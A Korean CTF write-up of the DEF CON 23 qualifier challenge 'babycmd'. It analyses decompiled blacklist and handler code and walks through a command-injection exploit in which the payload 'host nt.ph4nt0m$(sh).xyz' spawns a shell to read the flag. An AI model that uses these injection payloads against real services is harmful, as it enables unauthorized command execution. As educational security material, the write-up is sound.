---
title: "DEF CON 23 CTF Qualifier: babycmd"
date: 2015-05-15
description: "DEF CON 23 babycmd writeup: command injection via blacklist bypass, 64-bit Linux binary, shell escaping techniques"
tags: ["DEF CON", "CTF", "command-injection", "pwn", "64-bit", "bypass"]
platform: "ctf"
category: "pwn"
difficulty: "medium"
categories: ["CTF"]
authors:
  - name: "ph4nt0m"
    link: "https://github.com/Phantomn"
    image: "https://github.com/Phantomn.png"
---

## checksec

```
[*] '/mnt/c/Users/user/Desktop/pwnable/babycmd'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    FORTIFY:  Enabled
```

스택 카나리와 NX가 있어 고전적인 스택 오버플로우와 셸코드 인젝션은 불가능하다. 취약점은 애플리케이션 로직 레이어에 있다 — 잘못 필터링된 셸 명령 템플릿을 통한 명령 인젝션이다.

## 프로그램 실행

```
➜  pwnable ./babycmd

Welcome to another Baby's First Challenge!
Commands: ping, dig, host, exit
: ping 8.8.8.8
PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
64 bytes from 8.8.8.8: icmp_seq=1 ttl=116 time=37.6 ms
...

Commands: ping, dig, host, exit
: dig google.com
...

Commands: ping, dig, host, exit
: host google.com
google.com has address 172.217.26.238
...
```

바이너리는 `ping`, `dig`, `host`, `exit` 네 가지 명령을 받는다. 각각 `popen`을 통해 해당 시스템 유틸리티를 실행한다. 과제는 이 래퍼들 중 하나를 통해 임의의 셸 명령을 인젝션하는 것이다.

## 분석

### 입력 읽기 및 명령 디스패치

```c
__int64 __fastcall main(int a1, char **a2, char **a3)
{
  char v9[272];   // [rsp+0h]  [rbp-258h]  — 원시 입력 버퍼
  char dest[264]; // [rsp+110h] [rbp-148h] — 명령 이름

  ...
  while ( 1 )
  {
    printcmd_D3A();
    // v9에 최대 255바이트를 읽음
    ...
    v6 = strcspn(v9, " ");  // 첫 번째 공백을 찾음
    strncpy(dest, v9, v6);  // 명령 이름을 복사
    dest[v6] = 0;

    cmd = strchr(v9, ' ');  // 인자에 대한 포인터 (공백 이후)
    if ( !strcasecmp(dest, "ping") )  ping_E35(cmd);
    else if ( !strcasecmp(dest, "dig") )   dig_F5C(cmd);
    else if ( !strcasecmp(dest, "host") )  host_10BD(cmd);
  }
}
```

### 블랙리스트 필터 — `check_D65`

세 핸들러 모두 셸 명령을 구성하기 전에 `check_D65`를 호출한다. 사용자 인자의 각 문자를 정제된 버퍼로 복사하지만, 다음 문자들에 대해서는 0(실패)을 반환한다:

```c
__int64 __fastcall check_D65(char *cmd, _BYTE *a2)
{
  ...
  while ( v2 == ' ' ) { ... }          // 앞의 공백을 건너뜀
  if ( (unsigned __int8)(v2 - '&') <= 1u ) return 0;  // & 와 '
  if ( v2 == '|' )   return 0;
  if ( v2 == '*' )   return 0;
  if ( (v2 & 253) == '!' ) return 0;   // ! 와 #
  if ( (unsigned __int8)(v2 - ':') > 1u )
  {
    *a2++ = v2;  // 위 조건을 모두 통과 — 복사
    goto LABEL_9;
  }
  return 0;  // ; 와 :
}
```

차단 목록: `&`, `'`, `|`, `*`, `!`, `#`, `;`, `:`

주목할 점은 `$`와 백틱 `` ` ``은 **차단되지 않는다**.

### `ping` 핸들러

```c
if ( inet_aton(cp, &in) )  // IPv4 형식 유효성 검사
{
  __sprintf_chk(command, 1LL, 384LL, "ping -c 3 -W 3 %s", v1);
```

`inet_aton`이 IPv4 점-십진 표기법을 엄격하게 검사한다. 여기서는 인젝션이 불가능하다.

### `dig` 핸들러

```c
__sprintf_chk(command, 1LL, 384LL, "dig '%s'", cp);
```

인자가 **싱글 쿼트**로 감싸진다. 싱글 쿼트 안에서 셸은 모든 것을 리터럴로 처리한다 — `$()`와 백틱 치환이 확장되지 않는다. 인젝션 불가.

### `host` 핸들러

```c
__sprintf_chk(command, 1LL, 384LL, "host \"%s\"", cp);
```

인자가 **더블 쿼트**로 감싸진다. 더블 쿼트 안에서 셸은 여전히 `$()`와 `` `...` `` 명령 치환을 확장한다. 이것이 인젝션 포인트다.

### 보조 필터 — `check2_DCC`

IP가 아닌 인자의 경우, `dig`와 `host`는 추가로 `check2_DCC`를 호출하여 검사한다:
- 전체 인자 길이 ≤ 63자
- 첫 번째 문자는 영숫자여야 함
- 마지막 문자는 영숫자여야 함

```c
_BOOL8 __fastcall check2_DCC(const char *cmd)
{
  length = strlen(cmd) + 1;
  if ( length - 4 <= 60 )  // length ≤ 63
  {
    if ( isalpha(*cmd) || isdigit(*cmd) )  // 첫 문자 영숫자
    {
      v3 = cmd[length - 2];
      if ( isalpha(v3) || isdigit(v3) )   // 마지막 문자 영숫자
        return 1;
    }
  }
  return 0;
}
```

따라서 페이로드는 영숫자로 시작하고 끝나야 한다.

## 명령 치환 배경 지식

셸은 두 가지 형태의 명령 치환을 지원한다:

```bash
echo $(echo $(ls))     # dollar-paren — 중첩이 깔끔하게 동작
echo `echo \`ls\``     # 백틱 — 중첩에 이스케이프가 필요
echo `echo `ls``       # 깨짐 — 안쪽 백틱이 바깥 백틱을 닫음
```

`$`는 블랙리스트를 통과하고 괄호도 차단되지 않으므로, `$(...)` 형식이 신뢰할 수 있는 선택이다.

## 익스플로잇

### 1단계 — 인젝션 확인

```
: host nt.ph4nt0m$(ls).xyz
Host nt.ph4nt0mDescription.md
babycmd
babycmd.id0
...
flag
...
horcruxes.xyz not found: 3(NXDOMAIN)
```

`ls`의 출력이 호스트명에 삽입된다. 명령이 실행되고 있다.

### 2단계 — 플래그 직접 읽기 시도

`$(cat flag)`를 시도하면 셸이 명령 이름과 인자를 공백 없이 연결하기 때문에 실패한다:

```
: host nt.ph4nt0m.$(cat flag)xyz
sh: 1: catflag: not found
```

인젝션된 출력이 호스트명 토큰의 일부가 되어버린다. 공백이 포함된 명령을 실행하려면 완전한 대화형 셸이 필요하다.

### 3단계 — `$(sh)`로 셸 실행

```
: host nt.ph4nt0m$(sh).xyz
cat flag
exit
Host nt.ph4nt0m[+] Exploit Success.xyz not found: 3(NXDOMAIN)
```

`$(sh)`는 `popen` 호출 내부에서 서브셸로 대화형 `/bin/sh`를 실행한다. `cat flag`와 `exit`를 입력하면 플래그가 `host`가 해석하려는 결과 호스트명 문자열에 포함된다.

## 페이로드 분석

```
host nt.ph4nt0m$(sh).xyz
       ^^^^^^^^           — 영숫자 접두사 (check2_DCC 첫 문자 규칙 충족)
               ^^^^       — $() 명령 치환, check_D65에 차단되지 않음
                   ^^^^   — 영숫자 접미사 (check2_DCC 마지막 문자 규칙 충족)
```

바이너리가 구성하는 최종 셸 명령:

```bash
host "nt.ph4nt0m$(sh).xyz"
```

더블 쿼트 컨텍스트가 `$(sh)`의 확장을 허용하여 셸을 실행하고, 이후 `cat flag` 명령을 읽는다.

## 요약

`babycmd`는 블랙리스트 기반 입력 정제가 얼마나 취약한지 보여준다. 필터는 명백한 메타문자(`|`, `;`, `&`)는 올바르게 차단했지만 `$`를 놓쳤다 — `$(...)` 명령 치환의 핵심이다. `dig` 핸들러는 싱글 쿼트가 모든 치환을 막으므로 안전했던 반면, `host`는 더블 쿼트를 사용해서 `$()`가 여전히 확장됐다. 보조 길이 및 영숫자 경계 검사는 치환 코드를 무해한 호스트명 조각 사이에 감싸는 것으로 쉽게 충족할 수 있었다.
